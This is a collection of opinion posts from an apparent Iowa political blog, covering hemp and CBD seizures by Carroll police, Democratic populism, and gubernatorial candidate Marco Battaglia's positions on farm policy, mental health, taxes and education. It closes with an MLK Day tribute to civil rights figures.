Tremendous thank you to each and every Iowa Senator who voted to approve agricultural hemp. I’ve been told recently that my dismay at the inability of the community to come together and address the lack of education, caring, and Christ-like concern around marijuana and other racially charged drug war issues is unfounded, and to have faith that Iowans will truly care here very shortly. My ten years as a marijuana activist says otherwise. When it comes to marijuana, Iowans seem to enjoy victimizing and terrorizing those who wish to medicate in peace, while hiding any embarrassments that are virtually universal and should be seen as health issues instead of being sanctioned criminally.
You can find your legislator’s email to email them to support hemp here: https://www.legis.iowa.gov/legislators/find
Please also follow Iowa NORML and the Iowa Hemp Association on Facebook as they are taking the lead in lobbying for and promoting hemp education around the state.

Carroll Police Breaking Laws To Seize Legal Hemp CBD
Carroll Police Breaking Laws To Seize Legal Hemp CBD
Carrie Bluml has been slandered. Paperwork filed Friday, April 13th in court says she is in the right, and that the town of Carroll has some accounting to do.
People in Carroll have been saying Carrie’s shop, Nature Ammil, located at 820 West 8th Street, has been growing marijuana. Located right next to McDonald’s, Nature Ammil has been accused of having cannabis oil as a dispensary in violation of new laws (the store wasn’t). While at a firefighter fundraiser, Carrie was approached by multiple saying they heard she was selling marijuana out of her store.
Meanwhile, an 86 year old man with Parkinson’s has been going to the County Attorney’s office asking when he can use hemp CBD, without THC, so he can function.
This whole thing stems from Carroll Police and their unwillingness to cite any valid law for their warrantless seizure of non-THC hemp products since December 27th of 2017.
Denison police have confirmed that hemp CBD is fully legal. Ames Police have confirmed that hemp CBD is legal. While hemp CBD is legal, CBD sold through Iowa licensed medical marijuana dispensaries is not. That CBD, which unlike hemp derived CBD does contain THC, will be available for Iowans with a multitude of medical conditions from chronic back pain on the farm to clients with more severe medical patients, such as the 86 year old Carroll man who keeps asking for relief in a town that seems to have no compassion.
Carroll Police refuse to speak to reporters citing an ongoing investigation that is now nearly four months old. Carroll Police Sergeant Officer JJ Schreck told stated by phone that, in spite of the separate laws concerning hemp CBD, that “CBD is CBD is CBD” and that as experts on laws they cannot cite or explain, they do not submit to any authority other than themselves. That’s plain wrong.
Without adequate police oversight, communities suffer. While Carroll Police have gone undercover against local newspapers to attack freedom of speech, failing to follow proper police procedure seems to be a regular problem at the PD. While other police departments executed search warrants and followed due process requirements in other towns throughout Iowa before confirming the products sold at Nature Ammil are legal as long as there’s no THC, no warrant was served on Nature Ammil when Nature Ammil’s products were taken.
To compound the situation, the supposed drug tests cited on the December 27th police report don’t seem to have ever happened. Worse yet, the products were not properly catalogued. It appears the police are telling newspapers different stories that don’t add up.
Other town citizens have advised Nature Ammil to just let the cops abuse them. Reports of citizens saying that Carroll PD has been like this for years, and “this is just the way it is” have been frequent.
That’s why I’m writing this editorial.
As Executive Director of Iowa’s largest medical marijuana lobbying group it is my job to make sure that good hearted, value driven Iowans are defended from bullies. When 86-year old men with Parkinson’s are asking for help, someone needs to listen and respond accordingly.
CBD is a miracle. Children with epilepsy have had their lives saved when everything else failed. Older people with arthritis have found relief from the products that will likely continue to be sold at Nature Ammil post investigation with no side effects and no “high.” Opiates, which cause drowsiness and make people uncomfortable, have been replaced with CBD in many states. Iowa will be one of them in December.
But before state authorized CBD is available – for details, see Iowa Code Chapter 124 as well as House File 524 from the 2017 legislative calendar – unauthorized, non-medical CBD is available throughout the state. This legal product has always been legal. Carroll Police mistakenly thought that the new CBD law outlawed the legal hemp products. That is simply not the case.
In order for a community to be protected and well served it’s citizens must demand accountability. Before any more rumors about illegal marijuana activity are permitted to percolate, please be aware that hemp CBD is not the same plant source as marijuana CBD, and that there are two different statutes governing the substances. For further questions feel free to email me at playsoccer711@gmail.com. I have recently gotten word that COMPLETELY LEGAL FEDERALLY, STATE, AND LOCALLY, CBD OIL was seized from a number of businesses in Des Moines in the last few months as well. Please let me know if this can be confirmed.

Democrats Should Not Abandon Their Populist Roots
Trump supporters love their country. They care about whether people are getting a reasonable wage from their employer. Trump supporters are skeptical about corporate America. Fear is struck in the heart of rural America because of the corporate policies and advocacy of the World Trade Organization.
The people of West Virginia, Kentucky do not hate people of different races. They believe in the words of Jesus Christ and simply would give anyone their last dime if they know someone that happened to be their neighbor needed it.
I will always have more love in my heart for Trump supporters than I will Jeff Flake, Jeb Bush or Ben Sasse because I understand that the Trump supporters are misunderstood. The Flakes, Bushes of the world are certainly more polished and diplomatic. There is no doubt that their style is more “acceptable” on a world stage. It is difficult to be civil with people like Sasse who do not fear the loss of their own income due to an industrial revolution. I would ask Ben Sasse to go to the most rural parts of Nebraska and ask himself again whether humanity has truly dealt with the concept of an industrial
revolution in a humane fashion.
Patriotism has been confused with statism, and economic nationalism has been tied to racism or tribalism. Capitalism is a beautiful thing, but you have to realize that capitalism can and does put communities at war with each other. That competition is a great thing, but to call someone a statist due to the fact that they seek economic development for their community is not statist, it is nowhere close to the concept of statist thought.
Political consultants like Rick Wilson can call people statists until he’s blue in the face because it is always safe to presume that Rick will have the skill set to survive in this economy.
There is no doubt that the free market strategy pushed by Flake, Sasse, and Bush looks better on a chart and makes a lot of practical sense. Their approach to economics simply takes profits into account and does not factor in people.
Let me be straight with the immigrants that are coming to this country and seeking new opportunities. Ben Sasse and others may make it easier for you to get into the country originally, but they DO NOT care about you. They care about companies making money on the global stage. They care about shareholders, and truly a concentration of opportunity the likes of which we have never seen before.
Why in the world do you think some of these groups on the left and the right are so against a merit-based immigration system? Sure. Many of them are very concerned about human rights violations, genocide, etc. The truth is though that there are others who just do not care about the living situation for immigrants here in the United States. Some people will make it harder for immigrants to work in the energy sector.
So the reason that I am writing this is to offer an olive branch to Trump supporters. To urge them to stay away from the party of corporate profits, and to come back to the party of the people. We have plenty of disagreement within the Democratic Party, but the number one principle that we have is that people matter. Life is much more than an academic exercise with stats and data, despite what Ben Sasse says.
This open letter isn’t meant to be an anti-corporate rant either, the fact of the matter is though if we want this country to be great, great again, whatever you want to say we need serious commerce from sea to shining sea and everything in between.
Democrats owe Trump supporters an apology as we offer this olive branch. Appalachia is not a shithole. Middle America is not flyover country. We are talking about strong people with time-tested values, the most important value of all-being compassion.
I understand your frustration over the energy sector, and how the Democratic Party has abandoned you on this issue. I know that we as Democrats have NEVER done enough and in some people’s valid opinions anything to help replenish commerce in part of the country that has been damaged by idealistic energy policies. I supported Jim Webb for President of the United States in 2016 because I was looking for a candidate that struck the right balance between all forms of energy production. Period.
We have already seen people abandon solid people like Nick Rahall, Lucas and the Blue Dog Democrats to become Trump supporters. The truth of the matter is that the spirit to make America more economically vital again is something that Blue Dogs and President Trump have in common. I would plead with the people of West Virginia that supported Donald Trump not to abandon Joe Manchin. Evan Jenkins himself was a Democrat not very long ago.
This not an anti-profit, anti-company manifesto either, this is about patriotism and whether or not we want our country to thrive. People in the media are ready to chalk this all up to racism and want to go it alone in the world. Populism should always be a part of the Democratic Party. Questioning BAD trade agreements should always be a part of the Democratic Party. Yes, violating the human rights of workers may give some employers more freedom in life, but when did this become a principle that only this new brand of populist Republican can focus on?, It isn’t. This matter has nothing to do with race or gender.
Unethical business people like to attack blacks, Hispanics, Asians, etc. and women as well. Trump supporters understand this, and so do many, many members of the Democratic Party.

Paying my respects to Chief War Eagle by Gubernatorial Candidate Marco Battaglia
Paying my respects to Chief War Eagle
By Gubernatorial Candidate Marco Battaglia
“TERRITORY, It’s just the body of the nation
The people that inhabit it make its configuration
PREJUDICE, Something we all can do without
Cause a flag of many colors is what this land’s all about”
Anthrax- Indians
Wambdi Okicize is commonly known as Chief War Eagle. Chief War Eagle is best remembered as a person who believed in peace and worked his whole life toward that goal. Because of his leadership among the tribes, the Indians and the whites learned to work together without having to resort to violence. As I was touring around Western Iowa last week I was able to stop by Chief War Eagle’s burial site. Other members of his family are also buried there, including Dawn and Blazing Cloud. The vibes and the views are breathtaking. An impressive monument honors the great chief, and depicts him with the eagle feather bonnet and ceremonial pipe, symbolizing his brave leadership and his commitment to peace. Housing projects on the east base of the bluff also bear his name. I was also able to chat with Anthrax vocalist Joey Belladonna and watch him perform live in Sioux City. Belladonna is part Iroquois on his mother’s side. I spoke to a number of people present at the concert that were from the Winnebago Reservation and it was just an unforgettable trip all around.
The War Eagle site is awesome. The 31-foot monument of Chief War Eagle overlooks three states from atop a bluff along the Missouri River in Sioux City. His contribution to the peaceful settlement of what was later to become Sioux City has gone down as most excellent and beautiful American history. War Eagle was born a Santee Sioux in a dim Minnesota forest about 1785. He left his own tribe, the Santee, to avoid bloodshed in a fight as to who would be chief. As a young man, War Eagle spent considerable time working among the white Americans. During the War of 1812, he carried messages for the United States government, and worked among the native peoples to promote the cause of the United States against the British.
War Eagle eventually was elected chief of the Yankton Sioux. He established and maintained a good feeling among the Yanktons for the early white traders. It was during the 1830s that War Eagle was pilot on the upper Mississippi and dispatches for the early trappers up and down the river. Later, his warriors escorted U.S. mail between trading posts. During this time, War Eagle met and became a very good friend of Theophile Bruguier, a well-educated trader who came from Canada and was one of the first white traders in Sioux City. Bruguier found a fascination with Indian life and culture. He deserted the white man’s civilization and joined the Sioux tribe. Many lasting bonds were created between War Eagle and area American settlers, which set a tone of friendship that spread through the area. War Eagle refused to send his warriors on attacks against whites and this brazenness in the face of hostile and overwhelming odds marked him as a man of great courage.
Once when Sioux tribes gathered at what is now Riverside for the New Ulm, Minn., attack, War Eagle refused to let his warriors join the warring Indians. And when the Sioux were on the warpath and camped in what is now Stone Park on their way to the Spirit Lake massacre, War Eagle adamantly refused to allow his warriors to take part. War Eagle received a silver medal from President Martin Van Buren in 1837 in honor of his work in Washington, D.C. to negotiate peace treaties. War Eagle was especially proud of this Peace Medal. That visit to Washington marked the largest gathering of chiefs and warriors of different nations and tribes in history. Several treaties were signed, and these resulted in peaceful settlement of Indian tribes along both the Mississippi and Missouri rivers. Aside from the wonderful monument, Chief War Eagle is also memorialized with human rights awards bearing his name, given to recipients in Sioux City that continue to demonstrate his spirit today. I believe that many Iowans would love to continue to live in the spirit of the great chief.
Marco Battaglia writes for the Iowa Free Press and is a proud member of The Fourth Estate. Marco Battaglia is running to be Iowa’s 44th Governor, and the first since James W. Grimes not to be from the Democratic or Republican parties. Marco Battaglia firmly believes that Iowans deserve the freedom to choose for themselves how they work the land.

“It is gratifying to me, of course, to hold the undisputed world’s title. I am glad it is held in America, glad that I brought it here. But I mean my life to be more than a mere wrestling exhibition. I expect to be an Iowa farmer all my life, and make my life worth something. I hope that every year may find me a little better man in some way than I was the year before.
I want to be a good citizen and a helpful, useful man.”
Frank A Gotch
The best thing the government can do right now in regards to advances or alternatives to burning coal and natural gas for energy, or to the internal combustion engine or transportation in general, is get out of the way. We can allow for a freer market for energy and transportation. We can allow for the fairest possible competition between biofuel, gas, and electric. One day electrical vehicles may be ideal but as of the moment about 30% of our electricity in the USA still comes from coal and we make another 34% by burning natural gas. It doesn’t matter if your electric car has no emissions if the electricity it uses is still coming from burning coal or natural gas.
Hydrogen powered vehicles are another alternative on the horizon that are very appealing to me because hydrogen can be produced domestically and it burns cleanly. I feel that a freer market would allow for hydrogen powered vehicles to become a familiar competitor much sooner! There is also the potential for photo-voltaic cells powering public transportation using solar energy directly. I see great things on the horizon in terms of earth friendly transportation! Iowa can help ensure the horizon comes sooner rather than later.
Government subsidized agribusiness pollution is a leading cause of the dead zones that plague waters from the Chesapeake Bay to the Gulf of Mexico. Ruminant digestion and manure management associated with domestic livestock in subsidized CAFO settings and soil cultivation practices in regards to subsidized mass monoculture are among the biggest ways that humans negatively impact the environment. They also threaten Iowans economic and agricultural freedoms in terms of recreational opportunities, water quality, and free market competition. I propose that we phase out large agricultural subsidies on mono-culture and CAFOS. We should end the renewable fuel standard. Corn has not proven to be an ideal crop for bio-fuel or animal feed and the production of corn ethanol has actually had a negative impact on the environment. To protect farmers that have invested in government aided markets we can ease away from them with subsidies for farmers that agree to meet soil conservation and water quality goals. I also believe that we need to investigate cronyism in terms of eminent domain abuse and that we need to reform civil justice so that farmers that contribute to issues such as excessive nitrates can be made to build additional costs into their business models. I have both hemp and raw dairy freedom built into my agricultural freedom plan. Hemp and raw dairy could help reverse trends in many of our counties that are declining in population. Hemp and raw dairy freedoms are good starting points that would both provide additional ways to make income for farmers that want to try new things.
My father grew up on a farm in Minnesota and I have worked my own acreage when I have been able to make the time to. I believe that hemp and or cannabis farming would be best combined with a multi-cropping plan and to mix a cash crop, cover crop, and animal feed crops (Hemp Seed products), with other grasses, rye, and prairie restoration efforts. Something like this would provide the most sustainable situation. To me if you have the acres why would you not want to find perennials that can both make money, restore pollinator populations, and help with the nitrogen problem? A comprehensive state-wide strategy for reducing nutrients would have economic benefits, as well as show improvements to drinking water, recreation and health. I wholeheartedly believe more people would already be doing this if not for the way that the government has impacted the family farm.

Gubernatorial candidate Marco Battaglia on the Clubhouse Model of Mental Health Rehabilitation.
I learned so much from my tour of Passageway mental health clubhouse in Des Moines, Iowa. I met some wonderful people that have overcome great obstacles. I encourage the other gubernatorial candidates to visit. Passageway would be very excited to give you the tour. Many people I have spoken with, who have struggled with mental health, claim finding a place that will not turn them away and help them re-enter the workforce, is invaluable to them. Passageway does these things and so much more.
The Clubhouse Model of Psycho-social Rehabilitation is a comprehensive and dynamic program of support and opportunities for people with severe and persistent mental illnesses. In contrast to traditional day-treatment and other day program models, Clubhouse participants are called “members” (as opposed to “patients” or “clients”) and restorative activities focus on their strengths and abilities, not their illness. All participation in a clubhouse is strictly on a voluntary basis.
There are four guaranteed rights of membership, which are at the core of the Clubhouse Model:
A right to a place to come; A right to meaningful relationships; A right to meaningful work; and A right to a place to return.
The members and staff of a Clubhouse work side-by-side to manage all the operations of the Clubhouse, providing an opportunity for members to contribute in significant and meaningful ways; therefore, a Clubhouse is operated in a partnership model with members and staff working side-by-side as colleagues. The Clubhouse Model seeks to demonstrate that people with mental illness can successfully live productive lives and work in the community, regardless of the nature or severity of their mental illness. I believe that it would do wonders for people to have access to this model in every community in Iowa. A year of Clubhouse rehabilitation is akin to two years under hospital care. The Clubhouse Model has proven to reduce incarcerations, reduce hospitalizations and recidivism, and it is cost effective compared to the other existing mental health care approaches. I think we need to adjust the way that we fund mental health to better align with this model. I see it as very realistic that with some start-up help from state and local government clubhouses could take off all over the state and work towards independence from state funds.

Families United Action Network in Support of Shared Parenting Bill – SSB 3154
On Tuesday, a Senate Subcommittee meeting was held to discuss SSB 3154, a bill that would create a rebuttable presumption of equal shared parenting in child custody cases. I spoke as an associate of the organization Families United Action Network in support of this bill.
Currently, when divorcing parents walk into a courtroom, it is assumed that one parent will “win” and one parent will “lose” custody of the couple’s children. This societal standard has left generations of people suffering emotional turmoil all of their lives. According to fatherhood.org, children without their fathers are twice as likely to drop out of school and seven times more likely to become teen parents. They are more likely to abuse drugs and alcohol and suffer poverty. I cannot overstate the importance of a child’s own father in their lives.
These heavy statistics are painful to accept when I look at my step children. My family is a blended one, where my husband and I both have children from previous marriages, as well as our own. I ache for my husband’s children each time they hug their sobbing siblings goodbye for yet another long absence. Four days per month is not enough time to create family memories, enjoy hobbies, and impart important values. What good reason is there for two empty seats at the dinner table most nights? Their mother does not wish to share parenting and fought their father vigorously in order to keep him devalued as merely a visitor in their lives.
I have another perspective to offer, that is as a mother who does share parenting, disregarding our divorce papers to do so. My two teenage children have enjoyed living as equally as possible with their father and myself for the entire ten years we’ve been divorced. Well-adjustment in having both parents involved in their daily lives is obvious. Their father and I have each had the opportunity to build meaningful relationships with our kids, offer emotional stability and maintain trust. Shared parenting works. My children wouldn’t have it any other way.
My ex-husband and I are far from friends. It’s a misconnection that shared parenting to work requires there be no conflict. Shared parenting does require maturity and cooperation, which can learned over time after the pain of a separation. Resources exist to help high-conflict situations, such as apps like My Family Wizard, which aid communication between parents. Money spent fighting in ugly litigation for control could be spent instead on counseling to learn better co-parenting skills. In the long run, two divorced parents learning to co-parent, sharing equally in the lives of their children, without one parent being the “loser” and “visitor” is certainly in the best interest of children.
But you don’t have to take my word for it. Dr. Linda Nielsen, a professor of Adolescent and Educational Psychology at Wake Forest University, agrees with over 110 other social science experts and has reviewed at least 54 studies that overwhelmingly show that “children in shared physical custody families—with the exception of situations where children need protection from an abusive or negligent parent—have better outcomes across a variety of measures of well-being than do children in sole physical custody.”
Don’t let another generation of kids grow up missing half of their families. Don’t let another generation of kids become prizes to be won in a war where they can only lose. I urge our legislators to pass a rebuttable presumption of equal shared parenting bill so that the next generation of Iowa’s children, who must endure a divorce or separation, can maintain strong familiar bonds that will benefit them for a lifetime.

Marco Battaglia’s response to the Governor’s Condition of the State
Condition of the State Response
January 19, 2018
Marco Battaglia
Iowa is in dire need of Comprehensive Tax Reform
Governor Renyolds said that she wants to lower taxes but she has been hesitant to say what exactly her plan is. I’ve heard politicians from the right and left of me say my whole life that they were going to lower taxes. Studying the past administrations in Iowa I’ve heard these promises and this debate ongoing throughout the previous century. I am willing to say right now that my tax plan works to eliminate the income tax entirely while reducing property taxes for all Iowans. Instead of using the markets that we are working to open up, to spend more of your money, I want to use them to systematically decrease the size of Iowa Government and to simplify and reduce taxation for all Iowans; Not just ones that participate with my political party, that donate to my campaign, or that belong to a specific tax bracket.
Iowans need and deserve real solutions not “Reynolds-Care”
The Governor has doubled down saying that she believes in the current crony capitalism regarding the state’s medicaid. This is not a classic republican or a classic liberal position nor is it the right thing for Iowans at this time. I believe that true free market solutions will not leave the most vulnerable Iowans without assistance. There is this unfounded fear mongering about Libertarians that we would not look out for special needs or low income individuals and I am running in part to show that this could not be further from the reality. My platform actually works to restore access to services in regards to mental health, special needs, and low income peoples. It is my belief that that we can work to move towards a much freer market without making haphazard and dangerous cuts that effect these peoples and their loved ones.
I believe that Bill Dix should resign.
In regards to Majority Leader of the Iowa Senate Bill Dix I will go as far as to say that he needs to step down. Bill Dix, I am asking you to step down. I think that you should resign immediately. A majority of us that come from the private sector would be fired if we would have handled such behavior in our workplace in this manner.
Spending more and more money for worse and worse results?
Governor Reynolds said that we invested in our kids at a record level, committing $735 million more for education since 2011. Reynolds also said that over the last 10 years, only three states increased education funding at a higher rate than Iowa. I am not proud of this. The state’s growing contributions to K-12 don’t translate dollar-for-dollar to districts’ budgets. For decades—and as recently as 1992–Iowa students either led the nation in student achievement or were right at the top of the pack. The Iowa Tests of Basic Skills began, not surprisingly, right here in Iowa. So did the ACT assessment. No state can afford to be self-satisfied and to perpetuate the status-quo and I am afraid to say that our administrations since have done just that. Over the last two decades, Iowa has stagnated educationally. Many states, and even other nations, are now outperforming Iowa. I beseech the Governor to take a look at the fact that Iowa is the only state in the nation that hasn’t made significant progress in early math education since 1992. Iowa now ranks in the bottom ten states in the percentage of high school seniors who take and pass an Advanced Placement course.
I believe arguments that more English as a second language students, or that more poor students, play a role in this, are entirely bogus. More than 80 percent of Iowa’s students are still white kids that were raised knowing English only–and these students are no longer among the best in the nation. In fact, reading scores for non-poor, white students in Iowa on the NAEP assessment are now below the national average for their peer group. Students in 29 U.S. states are more likely to be advanced in math than these students in Iowa. And all students in 30 nations and provinces are more likely to be advanced math students than just these students in Iowa. In the knowledge economy, that is not nearly good enough–because Iowa students are no longer competing just against their peers in their community or in their state. They will be competing with students for jobs and admission to higher education with students from places like China, South Korea, Canada, India, and Russia. I actually believe that being bi or multi-lingual is an amazing thing for children to be and actually an early indicator that one is going to grow to be very intelligent. I need everyone that wants to participate to consider what kind of return we are getting on our investments here? Are there true school choice and free market solutions that could move us in a better direction at a much lower cost? Is there any excuse for a child with educated guardians and connection to the internet not to have access to a world class education in the year 2018?
I believe that Iowans should be able to set their own high bar in terms of education standards. State and local governments should be able to lead the way on raising standards, measuring and supporting teacher and leader effectiveness, re-evaluating the skills that children are taught, and closing achievement gaps. Iowans need the freedom to be leaders in implementing innovation to increase and improve learning. Iowa has one of the weakest charter school laws in the nation, limiting educational flexibility and experimentation. Iowans need true alternative certification programs and options for true competition, creating incentives for teachers or else we will continue to export our top talent to other states and other countries. Reynolds was right that the state’s contribution to K-12 education has increased by about $735 million since 2011 and she was right that over the last 10 years, only three states increased education funding at a higher rate than Iowa, but I would not use these items as a bragging points myself. A vast majority of Iowans believe that every child in all parts of Iowa should have access to quality education. I believe that my vision is best suited to ensure us a path there and that it ensures that we are improving on education for years to come. I believe that we can work smarter to improve education and actually save significant amounts of our money while returning Iowa to being a state that churns out people with world-class educations and skills.
Make Mental Health A Priority
Governor Reynold’s actually had the nerve to brag about the status of Mental Health Care in Iowa during her address. Perhaps if she was at the Gubernatorial mental health forum that I attended, she would have heard what Iowan’s think about the state of mental health care in Iowa. I don’t see how she could feel positive about being complicit in the direction that we having been going for decades on mental health in Iowa. I believe so strongly in my medical freedom platform that I am willing to say that it will not only increase care access to levels never before seen in Iowa but that it will draw top mental health professionals from all over the world to Iowa.
End the War on People
Not only was Kim Reynolds inaccurate with her numbers in regard to opioids during her address but why does she or any other elected official even bother to keep talking about them without addressing solutions to the problems? My medical freedom platform works to end the war on drugs so that addicts can ask for and receive help in lieu of fines, imprisonment, criminal records, and forced labor. It gives those that need pain relief alternatives to opioids if they choose them. This gives medical and public safety professionals affordable access and the ability to use life saving measures in every instance of opioid overdose. Under my vision officers of the law, legal, and medical professionals will all be able to focus on the violent crimes that are going on in Iowa. By expunging the records of those charged with non violent drug crimes we will return many people to the workforce and allow many Iowans to work their way up the economic ladder.
Give Iowans their land back
I understand that a Governor is unable to touch on everything in such an address but I must say that I am also disappointed that the Governor did not touch on opening up new markets for Iowa farmers such as hemp and raw dairy, and with how did she did not address the pressing pollinators, soil, and water quality issues.

The Iowa Free Press Reflects on MLK JR DAY 2018
“Injustice anywhere is a threat to justice everywhere. We are caught in an inescapable network of mutuality, tied in a single garment of destiny. Whatever affects one directly, affects all indirectly. Never again can we afford to live with the narrow, provincial “outside agitator” idea. Anyone who lives inside the United States can never be considered an outsider anywhere within its bounds.”
“I would be the first to advocate obeying just laws. One has not only a legal but a moral responsibility to obey just laws. Conversely, one has a moral responsibility to disobey unjust laws.”
“Sometimes a law is just on its face and unjust in its application. For instance, I have been arrested on a charge of parading without a permit. Now, there is nothing wrong in having an ordinance which requires a permit for a parade. But such an ordinance becomes unjust when it is used to maintain segregation and to deny citizens the First-Amendment privilege of peaceful assembly and protest.”
Taken from
“Letter from a Birmingham Jail [King, Jr.]”
Last year we talked about the power of boycott and the right that we all have to peaceful protest. This year I thought that we would talk about individual liberty. The most damned, banned, excluded, condemned, forbidden, ostracized, ignored, suppressed, repressed, robbed, brutalized and defamed of all ‘Damned Things’ is the individual human being. No one can, nor should, ever take away from a persons struggle. I simply find that for the declaration of independence, the constitution, and the bill of rights, to be worth the paper that they are printed on, that they must apply to everyone in their bounds. In 2018 I see similarities in the plights of every type of minority. Religious minorities, homeless of every color, racial minorities, lgbtq peoples, refugees, immigrants, ect. ect. As we are finally in a position to ensure that the founding beliefs of this country apply to all within our bounds, I am reminded that Dr. King was more upset not with those that commit aggressions but with those that stood by idly and did nothing.
Iowa has played a prominent role in the civil rights movement going all the way back to the beginning. Dred Scott, whose legal fight for freedom was ruled on in the 1857 Dred Scott Decision of the United States Supreme Court, lived with his family in Davenport as he followed his master to various military postings in the Midwest. Scott and his wife based their appeal for freedom on the fact that they had been held for extended periods of time in free states and territories, including Scott’s stay with his master in Davenport in 1834-36. An historic plaque was installed at the site of Scott’s residence in Davenport. African Americans fleeing both slavery and the Civil War came to Davenport because it was a major port in a free territory on the Mississippi River. Though I am still greatly inspired by reading Dr. King’s writing, this year I thought that we would look at some of his peers that helped make the world a better place for those of us that were yet to be born.
Sister Rosetta Tharpe
Sister Rossetta Tharpe influenced Martin Luther King Jr, Johnny Cash, Bob Dylan, Elvis Presley, Little Richard, Aretha Franklin, Chuck Berry, Eric Clapton, Jeff Beck, Keith Richards and Brian Jones, to name a few personages of historical significance. Robert Plant even immortalized her in a song of his own. I would say that it is tough to hear a popular song that is not influenced by someone that she influenced. Encouraged by her mother, Tharpe began singing and playing the guitar as Little Rosetta Nubin at the age of four and was cited as a musical prodigy. She rocked the Gibson SG before Angus and Tony and she also sang while doing so. Tharpe defied religious, gender, and race roles as they were and are typically depicted during her lifetime. Her performances both shocked and awed the crowds, and were controversial as well as revolutionary in several respects. At the time performing gospel music for secular nightclub audiences and alongside blues and jazz musicians and dancers was all but unheard of. You don’t exactly have to be Marty McFly to watch surviving footage of her and experience how far out she actually was. She could and did outplay many men of the time exemplifying her skills at guitar battles at the Apollo. Tharpe toured around the world representing a nation that she proved could be tolerant, caring, and a global leader in civil and human rights. Tharpe continued recording during World War II, one of only two gospel artists able to record V-discs for troops overseas.
James Farmer
James Farmer served along MLK JR as a civil rights activist and leader. He also pushed for nonviolent protest to dismantle segregation. He was the initiator and organizer of the 1961 Freedom Ride, which eventually led to the desegregation of interstate transportation in the United States. Farmer was a child prodigy; as a freshman in 1934 at the age of 14, he enrolled at Wiley College, in Marshall, Texas. He was selected as part of the debate team. At the age of 21, Farmer was invited to the White House to talk with President Franklin D. Roosevelt. Eleanor Roosevelt signed the invitation. Before the talk with the president, Mrs. Roosevelt talked to the group. Farmer took a liking to her immediately, and the two of them monopolized the conversation. When the group went in to talk to President Roosevelt, Mrs. Roosevelt followed and sat in the back. After the formalities were done, the young people were allowed to ask questions. Farmer said, “On your opening remarks you described Britain and France as champions of freedom. In light of their colonial policies in Africa, which give the lie to the principle, how can they be considered defenders?” The president tactfully avoided the question. She exclaimed, “Just a minute, you did not answer the question!” Although the president still did not answer the question as Farmer phrased it, Farmer was placated knowing that he had gotten the question out there. Farmer earned a Bachelor of Science at Wiley College in 1938, and a Bachelor of Divinity from Howard University School of Religion in 1941. At Wiley, Farmer became anguished over segregation, recalling particular occasions of racism he had witnessed or suffered in his younger days. During the Second World War, Farmer had official status as a conscientious objector. Inspired by Howard Thurman, a professor of theology at Howard University, Farmer became interested in peaceful protest. Martin Luther King Jr. also studied this later and adopted many of its principles. Farmer started to think about how to stop racist practices in America while working at the Fellowship of Reconciliation, which he joined after college.
Hosea Williams
Also depicted in the photo of King on the balcony the day before his death is Hosea Williams. Williams was arrested 125 times for his militant acts of defiance while working in service to the civil rights movement. Perhaps his passion for civil rights was a direct consequence of his having been beaten so severely he was hospitalized for five weeks because he had a drink at a “whites-only” bar. Not nearly as well known as King or Jackson, Williams nevertheless was a major figure in the civil rights movement with several triumphs to his credit. Because of his efforts, Savannah, Georgia, was the first city to ban “whites-only” lunch counters. He also led a march against the Klu Klux Klan in 1987 and won a $950,000 jury award after suing Forsyth County. He later became a senator.
Harry Belafonte
Actor, singer and activist Harry Belafonte has achieved lasting fame for such songs as ‘The Banana Boat Song (Day-O),’ as well as for his film and humanitarian work. Always outspoken, Belafonte found inspiration for his activism from such figures as singer Paul Robeson and writer and activist W.E.B. Du Bois. After meeting civil rights leader Martin Luther King Jr. in the 1950s, the two became good friends, and Belafonte emerged as a strong voice for the movement. He provided financial backing for the Student Nonviolent Coordinating Committee and participated in numerous rallies and protests. Belafonte helped organize the 1963 March on Washington, in which King delivered his famous “I Have a Dream” speech, and met with the civil rights leader shortly before he was assassinated in 1968.
Moses Fleetwood “Fleet” Walker
Moses Fleetwood Walker was an American professional baseball catcher who is credited with being the first openly black men to play in Major League Baseball (MLB). Walker was born in 1856 in Mount Pleasant, a working-class town in Eastern Ohio that had served as a sanctuary for runaway slaves since 1815. Its population included a large Quaker community and a unique collective of former Virginian slaves. He was also a businessman, a newspaper publisher and a scholar. He received patents for artillery shells and motion-picture devices. He wrote a book on race relations. Many people know of Jackie Robinson and it is well documented that the two ball players endured their own trials with racism in baseball. While both breaking barriers, Robinson went on to become good friends with Dr. Martin Luther King Jr. Not satisfied with his work on the diamonds, Robinson became even more involved in the civil rights movement after he retired in 1957. When King gave his righteous and impassioned address on the steps of the Lincoln Memorial on Aug. 28, 1963, Dodgers great Jackie Robinson stood just feet away, looking on with his children.
Kenny Washington
https://www.youtube.com/watch?v=7GstE32yLhU
Jackie Robinson and Kenny Washington stood shoulder-to-shoulder on the athletic fields of UCLA, as both excelled at football and baseball. Washington broke the NFL’s modern-era color barrier as a member of the Los Angeles Rams in 1946. What Kenny had to go through from his peers was in some ways harder than what Jackie Robinson had to endure. You could dodge a ball in baseball. But the Rams handed him the ball. One time in a game against the Washington, the players held him down, piled on top and put chalk in his eyes. Washington actively participated in politics.
Bill Russell
In 1950 Chuck Cooper became the first black player to be drafted when he was chosen by Boston; Nat “Sweetwater” Clifton became the first to sign an NBA contract when he signed with New York, and Earl Lloyd became the first to play in an NBA regular-season game because the schedule had his Washington team opening one day before the others. NBA legend Bill Russell was feet way from MLK JR. as he gave his “I Have A Dream Speech.” Russell was the in the middle of his legendary career — he had five championships and three MVPs at that point — and his presence helped some understand the need for equality that extended from buses to restaurant counters all the way to the basketball court. Russell lended his presence to the civil rights movement on multiple occasions.
Gil Scott-Heron
Gil Scott-Heron was an American soul and jazz poet, musician, and author, known primarily for his work as a spoken-word performer in the 1970s and 1980s. His collaborative efforts with musician Brian Jackson featured a musical fusion of jazz, blues, and soul, as well as lyrical content concerning social and political issues of the time, delivered in both rapping and melismatic vocal styles by Scott-Heron. His own term for himself was “bluesologist”, which he defined as “a scientist who is concerned with the origin of the blues”. His music, most notably on Pieces of a Man and Winter in America in the early 1970s, influenced and helped engender later African-American music genres such as hip hop and neo soul. In fact, Scott-Heron himself is considered by many to be the first rapper/MC ever, a recognition also shared by fellow American MC Coke La Rock. Scott-Heron remained active until his death, and in 2010 released his first new album in 16 years, entitled I’m New Here. A memoir he had been working on for years up to the time of his death, The Last Holiday, was published posthumously in January 2012. In an extract from this memoir written the year before he passed , Gil Scott-Heron talks about when he toured with Stevie Wonder to establish Martin Luther King Day as a national holiday in the US.

Dry Cleaning Facilities
